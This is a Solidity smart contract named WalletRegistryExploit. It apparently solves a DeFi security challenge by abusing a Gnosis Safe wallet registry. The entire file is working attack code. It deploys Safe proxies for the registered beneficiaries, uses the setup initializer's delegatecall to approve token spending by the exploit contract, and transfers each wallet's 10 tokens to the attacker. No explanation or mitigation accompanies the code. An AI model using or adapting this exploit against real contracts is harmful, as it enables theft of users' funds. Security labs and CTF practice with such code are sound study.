// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";

contract WalletRegistryExploit {
    address private immutable exploit = address(this);
    address private immutable attacker;
    address private immutable masterCopy; // address _singleton
    address private immutable walletFactory;
    address private immutable walletRegistry;
    address private immutable token;

    constructor(
        address attackerAddress,
        address masterCopyAddress,
        address walletFactoryAddress,
        address walletRegistryAddress,
        address tokenAddress
    ) {
        attacker = attackerAddress;
        masterCopy = masterCopyAddress;
        walletFactory = walletFactoryAddress;
        walletRegistry = walletRegistryAddress;
        token = tokenAddress;
    }

    function approve() external {
        IERC20(token).approve(exploit, 10 ether);
    }

    function attack(address[] calldata beneficiaries) public {
        require(msg.sender == attacker);

        for (uint8 i = 0; i < beneficiaries.length; i++) {
            address[] memory owners = new address[](1);
            owners[0] = beneficiaries[i];

            bytes memory payload = abi.encodeWithSignature("approve()");

            // https://github.com/safe-global/safe-contracts/blob/c36bcab46578a442862d043e12a83fec41143dec/contracts/GnosisSafe.sol#L75
            // https://github.com/5afe/safe-factories/blob/a104aeee07e54617f8bbf90b86972dc68b7de947/contracts/Safe_1_1_1_Factory.sol#L27
            bytes memory initializer = abi.encodeWithSelector(
                GnosisSafe.setup.selector,
                owners, // address[] calldata _owners
                owners.length, //  uint256 _threshold
                exploit, // address to
                payload, // bytes calldata data
                0,
                0,
                0,
                0
            );

            // https://github.com/safe-global/safe-contracts/blob/c36bcab46578a442862d043e12a83fec41143dec/contracts/proxies/GnosisSafeProxyFactory.sol#L82=
            address proxy = address(
                GnosisSafeProxyFactory(walletFactory).createProxyWithCallback(
                    masterCopy, // address _singleton
                    initializer, // bytes memory initializer
                    block.timestamp, // uint256 saltNonce
                    IProxyCreationCallback(walletRegistry) // IProxyCreationCallback callback
                )
            );

            IERC20(token).transferFrom(proxy, attacker, 10 ether);
        }
    }
}
